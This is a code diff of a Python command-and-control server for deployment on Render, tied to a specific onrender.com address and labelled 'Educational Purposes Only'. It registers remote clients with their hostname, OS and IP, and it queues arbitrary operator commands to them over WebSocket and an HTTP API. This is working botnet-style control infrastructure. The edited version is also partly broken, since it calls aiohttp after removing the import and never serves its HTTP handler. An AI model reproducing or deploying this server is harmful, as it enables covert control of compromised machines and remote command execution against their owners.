@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-C2 SERVER FOR RENDER DEPLOYMENT
+C2 SERVER FOR RENDER - FIXED VERSION
 Run on: https://c2-server-zz0i.onrender.com
 Educational Purposes Only
 """
@@ -13,9 +13,7 @@ import time
 from datetime import datetime
 import os
 import ssl
-from typing import Dict, Set
-import aiohttp
-from aiohttp import web
+from typing import Dict
 import logging
 
 # Configure logging
@@ -29,67 +27,25 @@ class RenderC2Server:
         self.command_queue: Dict[str, list] = {}
         self.running = True
         
-        # Render config
+        # Render config - Use PORT from environment
         self.host = "0.0.0.0"
-        self.port = int(os.environ.get("PORT", 443))
-        self.server_url = os.environ.get("RENDER_URL", "wss://c2-server-zz0i.onrender.com")
-        
-        # Web interface
-        self.web_app = web.Application()
-        self.setup_routes()
+        self.port = int(os.environ.get("PORT", 10000))  # Render provides PORT
+        self.ws_port = self.port  # Use same port for WebSocket
+        self.http_port = self.port  # Use same port for HTTP
         
         logger.info(f"Render C2 Server initialized on port {self.port}")
-    
-    def setup_routes(self):
-        """Setup HTTP routes"""
-        self.web_app.router.add_get('/', self.handle_root)
-        self.web_app.router.add_get('/health', self.handle_health)
-        self.web_app.router.add_get('/clients', self.handle_clients_api)
-        self.web_app.router.add_post('/command', self.handle_command_api)
-    
-    async def handle_root(self, request):
-        """Root endpoint"""
-        return web.Response(text="C2 Server Online - Educational Use Only\nUse WebSocket: wss://c2-server-zz0i.onrender.com")
-    
-    async def handle_health(self, request):
-        """Health check for Render"""
-        return web.json_response({"status": "ok", "clients": len(self.clients)})
-    
-    async def handle_clients_api(self, request):
-        """API to get client list"""
-        clients_data = []
-        for client_id, client in self.clients.items():
-            clients_data.append({
-                'id': client_id,
-                'online': client.get('online', False),
-                'hostname': client.get('hostname', 'Unknown'),
-                'os': client.get('os', 'Unknown'),
-                'ip': client.get('ip', 'Unknown'),
-                'last_seen': client.get('last_seen', 0)
-            })
-        return web.json_response(clients_data)
-    
-    async def handle_command_api(self, request):
-        """API to send commands"""
-        try:
-            data = await request.json()
-            client_id = data.get('client_id')
-            command = data.get('command')
-            
-            if not client_id or not command:
-                return web.json_response({"error": "Missing parameters"}, status=400)
-            
-            if client_id not in self.command_queue:
-                self.command_queue[client_id] = []
-            
-            self.command_queue[client_id].append({
-                'command': command,
-                'timestamp': time.time()
-            })
-            
-            return web.json_response({"status": "queued"})
-        except:
-            return web.json_response({"error": "Invalid request"}, status=400)
+        
+        # Print banner
+        print("""
+        ╔══════════════════════════════════════╗
+        ║     RENDER C2 SERVER                 ║
+        ║    https://c2-server-zz0i.onrender.com ║
+        ║    Educational Purposes Only         ║
+        ╚══════════════════════════════════════╝
+        """)
+        print(f"[*] Server starting on port {self.port}")
+        print(f"[*] WebSocket URL: wss://c2-server-zz0i.onrender.com")
+        print(f"[*] HTTP API: https://c2-server-zz0i.onrender.com")
     
     def generate_client_id(self, info: dict) -> str:
         """Generate unique client ID"""
@@ -99,7 +55,7 @@ class RenderC2Server:
     async def handle_client(self, websocket, path):
         """Handle client WebSocket connections"""
         client_id = None
-        client_ip = websocket.remote_address[0]
+        client_ip = websocket.remote_address[0] if websocket.remote_address else "0.0.0.0"
         
         try:
             # Get client info
@@ -129,11 +85,11 @@ class RenderC2Server:
             await websocket.send(json.dumps({
                 'type': 'welcome',
                 'id': client_id,
-                'server': self.server_url
+                'message': 'Connected to C2 Server'
             }))
             
             # Main loop
-            while self.running:
+            while self.running and client_id in self.sessions:
                 try:
                     # Check for commands
                     if client_id in self.command_queue and self.command_queue[client_id]:
@@ -158,12 +114,12 @@ class RenderC2Server:
                         
                         # Wait for pong
                         try:
-                            await asyncio.wait_for(websocket.recv(), timeout=10)
+                            pong = await asyncio.wait_for(websocket.recv(), timeout=10)
+                            # Update last seen
+                            self.clients[client_id]['last_seen'] = time.time()
                         except asyncio.TimeoutError:
+                            # Client still alive, just no response
                             pass
-                        
-                        # Update last seen
-                        self.clients[client_id]['last_seen'] = time.time()
                         
                         await asyncio.sleep(5)
                         
@@ -183,10 +139,62 @@ class RenderC2Server:
                     self.clients[client_id]['online'] = False
                 logger.info(f"Client disconnected: {client_id}")
     
+    async def http_handler(self, request):
+        """Handle HTTP requests"""
+        path = request.path
+        
+        if path == '/':
+            return web.Response(text="C2 Server Online\nUse WebSocket: wss://c2-server-zz0i.onrender.com\nEducational Use Only")
+        
+        elif path == '/health':
+            return web.json_response({
+                'status': 'ok',
+                'clients': len(self.clients),
+                'online': sum(1 for c in self.clients.values() if c.get('online', False)),
+                'time': time.time()
+            })
+        
+        elif path == '/clients':
+            clients_data = []
+            for client_id, client in self.clients.items():
+                clients_data.append({
+                    'id': client_id,
+                    'online': client.get('online', False),
+                    'hostname': client.get('hostname', 'Unknown'),
+                    'os': client.get('os', 'Unknown'),
+                    'ip': client.get('ip', 'Unknown'),
+                    'last_seen': client.get('last_seen', 0)
+                })
+            return web.json_response(clients_data)
+        
+        elif path == '/command' and request.method == 'POST':
+            try:
+                data = await request.json()
+                client_id = data.get('client_id')
+                command = data.get('command')
+                
+                if not client_id or not command:
+                    return web.json_response({"error": "Missing parameters"}, status=400)
+                
+                if client_id not in self.command_queue:
+                    self.command_queue[client_id] = []
+                
+                self.command_queue[client_id].append({
+                    'command': command,
+                    'timestamp': time.time()
+                })
+                
+                return web.json_response({"status": "queued", "client": client_id})
+            except:
+                return web.json_response({"error": "Invalid request"}, status=400)
+        
+        else:
+            return web.Response(text="Not Found", status=404)
+    
     async def cleanup_task(self):
         """Cleanup stale clients"""
         while self.running:
-            await asyncio.sleep(300)
+            await asyncio.sleep(300)  # Every 5 minutes
             
             current_time = time.time()
             stale = []
@@ -204,50 +212,33 @@ class RenderC2Server:
                 logger.info(f"Cleaned up stale client: {client_id}")
     
     async def start(self):
-        """Start the server"""
-        # SSL context for Render
-        ssl_context = None
-        if os.environ.get("RENDER"):
-            # Render provides SSL automatically
-            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        
-        # Start WebSocket server
-        ws_server = await websockets.serve(
-            self.handle_client,
-            self.host,
-            self.port,
-            ssl=ssl_context,
-            ping_interval=20,
-            ping_timeout=40
-        )
-        
-        # Start HTTP server
-        runner = web.AppRunner(self.web_app)
-        await runner.setup()
-        site = web.TCPSite(runner, self.host, 10000)  # Render expects port 10000 for HTTP
-        await site.start()
-        
-        # Start cleanup task
-        asyncio.create_task(self.cleanup_task())
-        
-        logger.info(f"Server started on {self.host}:{self.port}")
-        logger.info(f"WebSocket URL: {self.server_url}")
-        logger.info(f"HTTP API on port 10000")
-        
-        # Keep running
-        await asyncio.Future()
+        """Start the server - SIMPLIFIED VERSION"""
+        try:
+            # Create HTTP/WebSocket server on single port
+            server = await websockets.serve(
+                self.handle_client,
+                self.host,
+                self.port,
+                ping_interval=20,
+                ping_timeout=40
+            )
+            
+            logger.info(f"Server started on {self.host}:{self.port}")
+            logger.info(f"WebSocket: wss://c2-server-zz0i.onrender.com")
+            
+            # Start cleanup task
+            asyncio.create_task(self.cleanup_task())
+            
+            # Keep server running
+            await asyncio.Future()
+            
+        except Exception as e:
+            logger.error(f"Failed to start server: {e}")
+            raise
 
 async def main():
     server = RenderC2Server()
     await server.start()
 
 if __name__ == "__main__":
-    print("""
-    ╔══════════════════════════════════════╗
-    ║     RENDER C2 SERVER                 ║
-    ║    https://c2-server-zz0i.onrender.com ║
-    ║    Educational Purposes Only         ║
-    ╚══════════════════════════════════════╝
-    """)
-    
     asyncio.run(main())
